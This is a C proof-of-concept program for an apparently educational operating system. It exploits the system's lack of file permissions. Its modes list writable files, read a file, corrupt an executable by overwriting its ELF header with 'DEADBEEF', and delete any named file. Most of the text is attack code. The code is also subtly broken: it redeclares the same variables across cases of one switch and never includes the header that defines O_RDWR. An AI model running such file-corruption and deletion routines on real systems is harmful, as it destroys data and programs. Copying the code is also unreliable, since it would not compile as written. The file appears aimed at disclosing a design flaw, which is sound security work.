/**
 * @file poc_fs.c
 * @brief 漏洞 PoC #1: 文件系统缺乏权限控制
 * 
 * 漏洞类型: 结构性安全缺陷 - 无访问控制
 * 
 * 漏洞原理:
 *   1. 文件系统没有实现用户/权限模型
 *   2. 任何进程都可以读写、删除任意文件
 *   3. 可以篡改其他程序的可执行文件
 *   4. 可以删除系统关键文件
 * 
 * 用法: poc_fs [mode] [target]
 *   mode 0: 信息收集 - 列出可攻击的文件
 *   mode 1: 读取攻击 - 读取文件内容
 *   mode 2: 篡改攻击 - 破坏可执行文件使其无法运行
 *   mode 3: 删除攻击 - 删除指定文件
 * 
 * 示例:
 *   poc_fs 0           # 列出所有文件
 *   poc_fs 1 /echo     # 读取 echo 文件头
 *   poc_fs 2 /echo     # 破坏 echo 可执行文件
 *   poc_fs 3 /echo     # 删除 echo 文件
 */

#include "stdio.h"
#include "string.h"

int main(int argc, char *argv[])
{
	int mode = 0;
	char *target = "/echo";  /* 默认攻击目标 */
	
	printf("\n");
	printf("=============================================\n");
	printf(" PoC #1: File System Access Control Bypass\n");
	printf("=============================================\n\n");
	
	if (argc >= 2) {
		mode = argv[1][0] - '0';
		if (mode < 0 || mode > 3) {
			mode = 0;
		}
	}
	if (argc >= 3) {
		target = argv[2];
	}
	
	printf("[*] Vulnerability: No file permission model\n");
	printf("[*] Test mode: %d\n", mode);
	printf("[*] Target: %s\n\n", target);
	
	switch (mode) {
	case 0:
		/* 信息收集：尝试打开各种文件 */
		printf("=== Mode 0: Information Gathering ===\n\n");
		
		char *targets[] = {
			"/dev_tty0", "/dev_tty1", "/dev_tty2",
			"/cmd.tar", "/echo", "/pwd", "/ps", 
			"/kill", "/ls", "/touch", "/rm",
			"/cat", "/editor", "/logman", 0
		};
		
		int i;
		int count = 0;
		for (i = 0; targets[i] != 0; i++) {
			int fd = open(targets[i], O_RDWR);
			if (fd >= 0) {
				printf("[+] %-12s WRITABLE (fd=%d)\n", targets[i], fd);
				close(fd);
				count++;
			} else {
				printf("[-] %-12s not found\n", targets[i]);
			}
		}
		
		printf("\n[!] Found %d writable files!\n", count);
		printf("[!] Any process can read/write/delete them.\n");
		break;
	
	case 1:
		/* 读取攻击：读取可执行文件内容 */
		printf("=== Mode 1: Read Attack ===\n\n");
		
		int fd = open(target, O_RDWR);
		if (fd < 0) {
			printf("[-] Failed to open %s\n", target);
			return 1;
		}
		
		char buf[128];
		int n = read(fd, buf, sizeof(buf));
		close(fd);
		
		if (n > 0) {
			printf("[+] Read %d bytes from %s\n\n", n, target);
			
			/* 十六进制显示 */
			printf("Hex dump:\n");
			int i;
			for (i = 0; i < n && i < 64; i++) {
				printf("%02x ", (unsigned char)buf[i]);
				if ((i + 1) % 16 == 0) printf("\n");
			}
			if (i % 16 != 0) printf("\n");
			
			/* 检查 ELF 魔数 */
			if (n >= 4 && buf[0] == 0x7f && buf[1] == 'E' && 
				buf[2] == 'L' && buf[3] == 'F') {
				printf("\n[+] Confirmed ELF executable!\n");
			}
		}
		
		printf("\n[!] Successfully read file without permission!\n");
		break;
	
	case 2:
		/* 篡改攻击：破坏可执行文件 */
		printf("=== Mode 2: Corruption Attack ===\n\n");
		
		int fd = open(target, O_RDWR);
		if (fd < 0) {
			printf("[-] Failed to open %s\n", target);
			return 1;
		}
		
		/* 读取原始 ELF 头 */
		char buf[16];
		int n = read(fd, buf, 16);
		if (n < 16) {
			printf("[-] Failed to read file header\n");
			close(fd);
			return 1;
		}
		
		printf("[*] Original header: ");
		int i;
		for (i = 0; i < 8; i++) {
			printf("%02x ", (unsigned char)buf[i]);
		}
		printf("\n");
		
		/* 关闭并重新打开以重置位置 */
		close(fd);
		fd = open(target, O_RDWR);
		
		/* 破坏 ELF 魔数 - 将 0x7f ELF 改为 DEAD */
		char poison[] = "DEADBEEF";
		n = write(fd, poison, 8);
		close(fd);
		
		if (n == 8) {
			printf("[+] Wrote 8 bytes of poison data!\n");
			printf("[+] New header: 44 45 41 44 42 45 45 46 (DEADBEEF)\n");
			printf("\n[!] File %s is now CORRUPTED!\n", target);
			printf("[!] Try running it: the system will fail to execute.\n");
		} else {
			printf("[-] Write failed (wrote %d bytes)\n", n);
		}
		break;
	
	case 3:
		/* 删除攻击 */
		printf("=== Mode 3: Delete Attack ===\n\n");
		
		/* 先确认文件存在 */
		int fd = open(target, O_RDWR);
		if (fd < 0) {
			printf("[-] File %s not found\n", target);
			return 1;
		}
		close(fd);
		
		printf("[*] File %s exists, attempting deletion...\n", target);
		
		int ret = unlink(target);
		
		if (ret == 0) {
			printf("[+] Successfully DELETED %s!\n", target);
			printf("\n[!] The file is gone. Try running it.\n");
		} else {
			printf("[-] unlink() returned %d\n", ret);
		}
		break;
	}
	
	printf("\n");
	printf("=== Structural Vulnerability Summary ===\n");
	printf("1. No user ID / ownership model\n");
	printf("2. No file permission bits (rwx)\n");  
	printf("3. No access control in FS operations\n");
	printf("4. Any process can tamper with any file\n");
	printf("\n");
	
	return 0;
}
